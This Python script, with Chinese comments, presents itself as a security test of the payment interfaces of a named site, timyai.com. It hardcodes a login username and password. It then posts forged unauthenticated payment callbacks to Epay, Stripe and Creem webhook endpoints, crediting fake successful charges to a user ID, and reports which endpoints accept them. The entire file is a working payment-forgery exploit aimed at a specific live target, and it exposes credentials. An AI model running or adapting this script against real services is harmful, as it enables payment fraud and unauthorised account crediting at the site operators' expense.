#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 支付接口安全测试脚本 - 改进版
"""

import requests
import json
import time
import hashlib

TARGET_URL = "http://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"

class TimyaiTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
        })
        self.token = None
        self.user_id = None
        
    def try_login_v1(self):
        """尝试标准登录"""
        print("[+] 尝试 v1 登录...")
        url = f"{TARGET_URL}/api/user/login"
        data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
        
        try:
            response = self.session.post(url, json=data, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:300]}")
            return response
        except Exception as e:
            print(f"    错误: {e}")
            return None
    
    def try_login_form(self):
        """尝试表单登录"""
        print("\n[+] 尝试表单格式登录...")
        url = f"{TARGET_URL}/api/user/login"
        data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
        
        try:
            response = self.session.post(url, data=data, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:300]}")
            return response
        except Exception as e:
            print(f"    错误: {e}")
            return None
    
    def try_status_endpoint(self):
        """测试状态接口"""
        print("\n[+] 测试 API 状态...")
        url = f"{TARGET_URL}/api/status"
        
        try:
            response = self.session.get(url, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:300]}")
            return response
        except Exception as e:
            print(f"    错误: {e}")
            return None
    
    def try_models_endpoint(self):
        """测试模型接口"""
        print("\n[+] 测试模型列表接口...")
        url = f"{TARGET_URL}/api/models"
        
        try:
            response = self.session.get(url, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:300]}")
            return response
        except Exception as e:
            print(f"    错误: {e}")
            return None
    
    def try_epay_direct(self):
        """直接测试 Epay 回调（无需认证）"""
        print("\n[+] 测试 Epay 回调接口（无需登录）...")
        import random, string
        
        fake_trade_no = f"SUBUSR999NO{''.join(random.choices(string.ascii_letters, k=6))}{int(time.time())}"
        
        params = {
            "trade_no": fake_trade_no,
            "status": "success",
            "amount": "500.00",
            "param": "user_id_999",
            "time": str(int(time.time())),
            "type": "alipay",
        }
        
        endpoints = [
            "/api/user/epay/notify",
            "/api/subscription/epay/notify",
        ]
        
        results = {}
        for endpoint in endpoints:
            print(f"\n    测试 GET {endpoint}...")
            try:
                response = self.session.get(f"{TARGET_URL}{endpoint}", params=params, timeout=10)
                print(f"    状态码: {response.status_code}")
                print(f"    响应: {response.text[:100]}")
                results[f"GET{endpoint}"] = {
                    "status": response.status_code,
                    "response": response.text[:100],
                    "vulnerable": response.status_code == 200 and response.text.strip().lower() in ["success", "ok"]
                }
            except Exception as e:
                print(f"    错误: {e}")
                results[f"GET{endpoint}"] = {"error": str(e)}
            
            print(f"    测试 POST {endpoint}...")
            try:
                response = self.session.post(f"{TARGET_URL}{endpoint}", data=params, timeout=10)
                print(f"    状态码: {response.status_code}")
                print(f"    响应: {response.text[:100]}")
                results[f"POST{endpoint}"] = {
                    "status": response.status_code,
                    "response": response.text[:100],
                    "vulnerable": response.status_code == 200 and response.text.strip().lower() in ["success", "ok"]
                }
            except Exception as e:
                print(f"    错误: {e}")
                results[f"POST{endpoint}"] = {"error": str(e)}
        
        return results
    
    def try_stripe_webhook(self):
        """测试 Stripe Webhook"""
        print("\n[+] 测试 Stripe Webhook...")
        
        fake_event = {
            "id": f"evt_test_{int(time.time())}",
            "object": "event",
            "type": "charge.succeeded",
            "data": {
                "object": {
                    "id": f"ch_test_{int(time.time())}",
                    "amount": 50000,
                    "status": "succeeded",
                    "metadata": {"user_id": "999"}
                }
            }
        }
        
        url = f"{TARGET_URL}/api/stripe/webhook"
        
        try:
            response = self.session.post(url, json=fake_event, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:100]}")
            return {
                "status": response.status_code,
                "response": response.text[:100],
                "vulnerable": response.status_code == 200
            }
        except Exception as e:
            print(f"    错误: {e}")
            return {"error": str(e)}
    
    def try_creem_webhook(self):
        """测试 Creem Webhook"""
        print("\n[+] 测试 Creem Webhook...")
        
        fake_event = {
            "event": "payment_succeeded",
            "data": {
                "id": f"pay_test_{int(time.time())}",
                "amount": 5000,
                "status": "succeeded",
            }
        }
        
        url = f"{TARGET_URL}/api/creem/webhook"
        
        try:
            response = self.session.post(url, json=fake_event, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:100]}")
            return {
                "status": response.status_code,
                "response": response.text[:100],
                "vulnerable": response.status_code == 200
            }
        except Exception as e:
            print(f"    错误: {e}")
            return {"error": str(e)}
    
    def run(self):
        """运行测试"""
        print("="*60)
        print("timyai.com 支付接口安全测试")
        print("="*60)
        
        # 1. 测试 API 状态
        self.try_status_endpoint()
        
        # 2. 尝试登录
        self.try_login_v1()
        self.try_login_form()
        
        # 3. 直接测试支付回调（无需认证）
        epay_results = self.try_epay_direct()
        stripe_result = self.try_stripe_webhook()
        creem_result = self.try_creem_webhook()
        
        # 总结
        print("\n" + "="*60)
        print("测试结果总结")
        print("="*60)
        
        vulnerable_count = 0
        
        print("\n易支付接口:")
        for k, v in epay_results.items():
            if "error" in v:
                print(f"  {k}: ❌ {v['error']}")
            else:
                status = "⚠️  可能存在漏洞" if v.get("vulnerable") else "✅ 安全"
                print(f"  {k}: {status} (状态码: {v['status']})")
                if v.get("vulnerable"):
                    vulnerable_count += 1
        
        print("\nStripe Webhook:")
        if "error" in stripe_result:
            print(f"  ❌ {stripe_result['error']}")
        else:
            status = "⚠️  可能存在漏洞" if stripe_result.get("vulnerable") else "✅ 安全"
            print(f"  {status} (状态码: {stripe_result['status']})")
            if stripe_result.get("vulnerable"):
                vulnerable_count += 1
        
        print("\nCreem Webhook:")
        if "error" in creem_result:
            print(f"  ❌ {creem_result['error']}")
        else:
            status = "⚠️  可能存在漏洞" if creem_result.get("vulnerable") else "✅ 安全"
            print(f"  {status} (状态码: {creem_result['status']})")
            if creem_result.get("vulnerable"):
                vulnerable_count += 1
        
        print(f"\n可能存在漏洞的接口: {vulnerable_count}")
        
        # 保存结果
        with open("timyai_results.json", "w") as f:
            json.dump({
                "epay": epay_results,
                "stripe": stripe_result,
                "creem": creem_result
            }, f, indent=2)
        print("\n结果已保存到: timyai_results.json")


if __name__ == "__main__":
    test = TimyaiTest()
    test.run()